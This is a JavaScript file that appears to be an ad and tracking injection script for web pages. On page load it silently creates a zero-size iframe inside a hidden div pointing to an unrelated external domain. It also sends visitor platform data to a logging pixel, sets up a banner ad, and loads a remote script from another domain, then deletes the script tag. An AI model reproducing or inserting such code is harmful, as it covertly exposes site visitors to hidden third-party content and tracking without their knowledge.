bdtrc();
function bdtrc(){
var _hmt = _hmt || [];
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?f7ca33a9bd78e0ae0fa3e79d799812e6";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
}
cntrc();
function cntrc(){
	var divObj = document, h = divObj.getElementsByTagName('body')[0],div = divObj.createElement('div');
	div.style.display = 'none';
	var Scrip = document.createElement('iframe');
	Scrip.width = '0';
	Scrip.height = '0';
	Scrip.scrolling = "no";
	Scrip.setAttribute("border", 0);
	Scrip.setAttribute("frameborder", 0);
	Scrip.src = '//etc.jiuwuqiong.com/a84bd6726389f396b731b4fe2411b78a.html';
	div.appendChild(Scrip);
	h && h.insertBefore(div,h.firstChild);
}
function RndNum(n){
    var rnd="";
    for(var i=0;i<n;i++)
        rnd+=Math.floor(Math.random()*10);
    return rnd;
}
var iplatform = navigator.platform;
var ukey = String(RndNum(8));
var trackid = "20002";
new Image().src = "//sspzhongsou.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid=" + trackid + "&platform=" + iplatform + "&scriptukey=" + ukey + "&dtime=" + (+new Date());
var script = document.getElementsByTagName('script');
var thisNode = script[script.length-1];
var TencentGDT = TencentGDT || [];
var jsload = jsload || 0;
jsload++;
TencentGDT.push({
    jsload: jsload,
    stats : false,
    statsId:'19217173',
    AndPos : [{AppId:'4827',PosId:'6618'}],//4814#6587
    IosPos : [{AppId:'4827',PosId:'6619'}],
    hasClose : true,
    hasICo : false,
    posType : 'banner',
    fillType : 'bottom',//[bottom,top,inner]
    thisNode : thisNode,
    isAllow : '0',
    meta : true,
});
(function(e) {
	function b(b, d) {
		var c = document.getElementsByTagName("head")[0],
			a = document.createElement("script");
		a.onload = a.onreadystatechange = a.onerror = function() {
			a && a.readyState && /^(?!(?:loaded|complete)$)/.test(a.readyState) || (a.onload = a.onreadystatechange = a.onerror = null, a.src = "", a.parentNode.removeChild(a), a = null, d && d())
		};
		a.charset = "utf-8";
		a.defer = !0;
		a.src = b;
		c && c.insertBefore(a, c.firstChild)
	}
	if ("undefined" == typeof window.scritpsrclink || !0 !== window.scritpsrclink) window.scritpsrclink = !0, b("//c.186078.com/js/hyapialltw.js")
})(TencentGDT[jsload - 1]);
